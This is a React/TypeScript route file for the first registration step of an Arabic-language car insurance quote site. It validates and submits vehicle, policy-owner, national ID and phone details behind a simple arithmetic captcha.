import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { ArrowLeft, Car, RefreshCw, ShieldCheck, User } from "lucide-react";
import { carBrands } from "@/lib/insurance-data";
import { submitCurrentStep } from "@/lib/workflow";
import { track } from "@/lib/gate";

export const Route = createFileRoute("/reg")({
  head: () => ({
    meta: [
      { title: "البيانات الأساسية — بيكير" },
      { name: "description", content: "أدخل بيانات التأمين والمركبة ومالك الوثيقة لعرض العروض المتاحة." },
      { property: "og:title", content: "البيانات الأساسية — بيكير" },
      { property: "og:description", content: "أدخل بيانات التأمين والمركبة ومالك الوثيقة لعرض العروض المتاحة." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: RegisterPage,
});

const PURPOSES = ["شخصي", "تجاري", "تأجير", "نقل الركاب أو كريم - أوبر", "نقل بضائع", "نقل مشتقات نفطية"];
const REPAIR_PLACES = ["الورشة", "الوكالة"];

function newCaptcha() {
  const a = Math.floor(Math.random() * 8) + 2;
  const b = Math.floor(Math.random() * 8) + 1;
  return { a, b, answer: String(a + b) };
}

function RegisterPage() {
  const navigate = useNavigate();
  const [form, setForm] = useState({
    insuranceKind: "",
    startDate: "",
    purpose: "شخصي",
    repairPlace: "الوكالة",
    estimatedValue: "",
    manufactureYear: "",
    make: "",
    model: "",
    ownerName: "",
    nationalId: "",
    phone: "",
    serialNumber: "",
    captcha: "",
  });
  const [captcha, setCaptcha] = useState(newCaptcha);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [fieldErrors, setFieldErrors] = useState<Record<string, string>>({});

  const update = (k: string, v: string) => {
    setForm((p) => ({ ...p, [k]: v }));
    setFieldErrors((p) => ({ ...p, [k]: "" }));
  };

  const validateNationalId = (v: string) => {
    if (!v.trim()) return "رقم الهوية الوطنية / الإقامة مطلوب";
    return /^[12]\d{9}$/.test(v) ? "" : "رقم الهوية/الإقامة يجب أن يكون 10 أرقام ويبدأ بـ 1 أو 2";
  };
  const validatePhone = (v: string) => {
    if (!v.trim()) return "يرجى إدخال رقم الهاتف";
    return /^05\d{8}$/.test(v) ? "" : "رقم الجوال يجب أن يبدأ بـ 05 ويحتوي على 10 أرقام";
  };
  const validateStartDate = (v: string) => {
    if (!v) return "التاريخ مطلوب";
    const d = new Date(v);
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    return d < today ? "لا يمكن اختيار تاريخ في الماضي" : "";
  };
  const validateSerial = (v: string) => {
    if (!v.trim()) return "يرجى إدخال الرقم التسلسلي";
    return /^\d{6,12}$/.test(v) ? "" : "الرقم التسلسلي غير صحيح. يجب أن يكون رقم تسلسلي سعودي صحيح";
  };

  const years = Array.from({ length: 30 }, (_, i) => String(2027 - i));

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const errors: Record<string, string> = {
      insuranceKind: form.insuranceKind ? "" : "يرجى اختيار نوع التأمين",
      startDate: validateStartDate(form.startDate),
      estimatedValue: form.estimatedValue ? "" : "يرجى إدخال القيمة التقديرية",
      manufactureYear: form.manufactureYear ? "" : "يرجى اختيار سنة الصنع",
      make: form.make ? "" : "اختر ماركة السيارة",
      model: form.model.trim() ? "" : "يرجى إدخال الموديل",
      ownerName: form.ownerName.trim() ? "" : "الرجاء أدخال الاسم كاملا",
      nationalId: validateNationalId(form.nationalId),
      phone: validatePhone(form.phone),
      serialNumber: validateSerial(form.serialNumber),
      captcha:
        !form.captcha.trim()
          ? "يرجى إدخال رمز التحقق"
          : form.captcha.trim() !== captcha.answer
            ? "رمز التحقق غير صحيح"
            : "",
    };
    setFieldErrors(errors);
    if (Object.values(errors).some(Boolean)) {
      if (errors["captcha"]) {
        setCaptcha(newCaptcha());
        setForm((p) => ({ ...p, captcha: "" }));
      }
      return;
    }
    setLoading(true);
    track("submit", { step: "register" });
    const res = await submitCurrentStep("customer_info", form);
    setLoading(false);
    if (res.success) {
      void navigate({ to: "/compare" });
    } else {
      setError(res.error || "حدث خطأ");
    }
  };

  const err = (k: string) =>
    fieldErrors[k] ? <p className="mt-1 text-xs text-red-600">{fieldErrors[k]}</p> : null;

  return (
    <div className="min-h-screen bg-dark-50 pt-16 md:pt-20">
      <div className="container-x py-8 md:py-12">
        <div className="mx-auto max-w-3xl">
          <div className="mb-6 text-center">
            <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-2xl bg-primary-100 text-primary-600">
              <Car className="h-8 w-8" />
            </div>
            <h1 className="mt-4 text-3xl font-extrabold text-dark-900">البيانات الأساسية</h1>
            <p className="mt-2 text-dark-500">أدخل بيانات التأمين والمركبة لعرض العروض المتاحة</p>
          </div>

          <div className="mb-6 flex flex-wrap justify-center gap-2 md:gap-4">
            {["البيانات الأساسية", "بيانات التأمين", "قائمة الأسعار", "الملخص والدفع"].map((label, i) => (
              <div key={label} className="flex items-center gap-2">
                <div className={`flex h-8 w-8 items-center justify-center rounded-full text-xs font-bold ${i === 0 ? "bg-primary-600 text-white" : "bg-dark-200 text-dark-500"}`}>
                  {i + 1}
                </div>
                <span className={`text-xs md:text-sm ${i === 0 ? "font-bold text-dark-900" : "text-dark-400"}`}>{label}</span>
              </div>
            ))}
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Insurance details */}
            <div className="card space-y-5">
              <div className="flex items-center gap-2 border-b border-dark-100 pb-3">
                <ShieldCheck className="h-5 w-5 text-primary-600" />
                <h2 className="text-lg font-bold text-dark-900">بيانات التأمين</h2>
              </div>

              <div>
                <label className="mb-2 block text-sm font-medium text-dark-700">نوع التأمين المطلوب</label>
              <div className="grid grid-cols-1 gap-3 md:grid-cols-3">
                  {[
                    { v: "third_party", label: "ضد الغير", desc: "تغطية أساسية للطرف الثالث" },
                    { v: "tpl-plus", label: "ضد الغير بلس", desc: "تغطية الغير مع مزايا إضافية" },
                    { v: "comprehensive", label: "تأمين شامل", desc: "تغطية كاملة لسيارتك" },
                  ].map((o) => (
                    <button
                      type="button"
                      key={o.v}
                      onClick={() => update("insuranceKind", o.v)}
                      className={`rounded-xl border-2 p-4 text-right transition ${form.insuranceKind === o.v ? "border-primary-600 bg-primary-50" : "border-dark-200 hover:border-primary-300"}`}
                    >
                      <div className="font-bold text-dark-900">{o.label}</div>
                      <div className="mt-1 text-xs text-dark-500">{o.desc}</div>
                    </button>
                  ))}
                </div>
                {err("insuranceKind")}
              </div>

              <div className="grid grid-cols-1 gap-5 md:grid-cols-2">
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">تاريخ بداية التأمين</label>
                  <input type="date" value={form.startDate} min={new Date().toISOString().slice(0, 10)} onChange={(e) => update("startDate", e.target.value)} className="input-field" dir="ltr" />
                  {err("startDate")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">غرض استخدام المركبة</label>
                  <select value={form.purpose} onChange={(e) => update("purpose", e.target.value)} className="input-field">
                    {PURPOSES.map((p) => <option key={p} value={p}>{p}</option>)}
                  </select>
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">مكان الإصلاح</label>
                  <select value={form.repairPlace} onChange={(e) => update("repairPlace", e.target.value)} className="input-field">
                    {REPAIR_PLACES.map((p) => <option key={p} value={p}>{p}</option>)}
                  </select>
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">القيمة التقديرية (ر.س)</label>
                  <input value={form.estimatedValue} onChange={(e) => update("estimatedValue", e.target.value.replace(/\D/g, "").slice(0, 7))} className="input-field" placeholder="مثال: 50000" inputMode="numeric" dir="ltr" />
                  {err("estimatedValue")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">الشركة المصنعة</label>
                  <select value={form.make} onChange={(e) => update("make", e.target.value)} className="input-field">
                    <option value="">اختر ماركة السيارة</option>
                    {carBrands.map((b) => <option key={b} value={b}>{b}</option>)}
                  </select>
                  {err("make")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">الموديل</label>
                  <input value={form.model} onChange={(e) => update("model", e.target.value)} className="input-field" placeholder="مثال: كامري" />
                  {err("model")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">سنة الصنع</label>
                  <select value={form.manufactureYear} onChange={(e) => update("manufactureYear", e.target.value)} className="input-field">
                    <option value="">اختر سنة الصنع</option>
                    {years.map((y) => <option key={y} value={y}>{y}</option>)}
                  </select>
                  {err("manufactureYear")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">الرقم التسلسلي</label>
                  <input value={form.serialNumber} onChange={(e) => update("serialNumber", e.target.value.replace(/\D/g, "").slice(0, 12))} className="input-field" placeholder="الرقم التسلسلي للمركبة" inputMode="numeric" dir="ltr" />
                  {err("serialNumber")}
                </div>
              </div>
            </div>

            {/* Owner details */}
            <div className="card space-y-5">
              <div className="flex items-center gap-2 border-b border-dark-100 pb-3">
                <User className="h-5 w-5 text-primary-600" />
                <h2 className="text-lg font-bold text-dark-900">بيانات مالك الوثيقة</h2>
              </div>

              <div className="grid grid-cols-1 gap-5 md:grid-cols-2">
                <div className="md:col-span-2">
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">اسم صاحب الوثيقة</label>
                  <input value={form.ownerName} onChange={(e) => update("ownerName", e.target.value)} className="input-field" placeholder="الاسم كما في الهوية" />
                  {err("ownerName")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">رقم الهوية الوطنية / الإقامة</label>
                  <input value={form.nationalId} onChange={(e) => update("nationalId", e.target.value.replace(/\D/g, "").slice(0, 10))} onBlur={() => form.nationalId && setFieldErrors((p) => ({ ...p, nationalId: validateNationalId(form.nationalId) }))} className="input-field" placeholder="أكتب رقم الهوية الوطنية / الإقامة هنا" inputMode="numeric" maxLength={10} dir="ltr" />
                  {err("nationalId")}
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">رقم الجوال</label>
                  <input value={form.phone} onChange={(e) => update("phone", e.target.value.replace(/\D/g, "").slice(0, 10))} onBlur={() => form.phone && setFieldErrors((p) => ({ ...p, phone: validatePhone(form.phone) }))} className="input-field" placeholder="05xxxxxxxx" inputMode="numeric" maxLength={10} dir="ltr" />
                  {err("phone")}
                </div>
                <div className="md:col-span-2">
                  <label className="mb-1.5 block text-sm font-medium text-dark-700">رمز التحقق</label>
                  <div className="flex items-center gap-3">
                    <div className="flex items-center gap-2 rounded-xl bg-dark-100 px-4 py-3 font-mono text-lg font-bold tracking-widest text-dark-800" dir="ltr">
                      {captcha.a} + {captcha.b} = ?
                      <button type="button" onClick={() => { setCaptcha(newCaptcha()); update("captcha", ""); }} className="text-dark-400 hover:text-primary-600" aria-label="تحديث رمز التحقق">
                        <RefreshCw className="h-4 w-4" />
                      </button>
                    </div>
                    <input value={form.captcha} onChange={(e) => update("captcha", e.target.value.replace(/\D/g, "").slice(0, 2))} className="input-field w-28 text-center" placeholder="الناتج" inputMode="numeric" dir="ltr" />
                  </div>
                  {err("captcha")}
                </div>
              </div>
            </div>

            {error && <p className="rounded-lg bg-red-50 px-4 py-2 text-sm text-red-600">{error}</p>}

            <button type="submit" disabled={loading} className="btn-primary w-full disabled:opacity-60">
              {loading ? "جاري عرض الأسعار..." : "عرض العروض المتاحة"}
              <ArrowLeft className="h-5 w-5" />
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
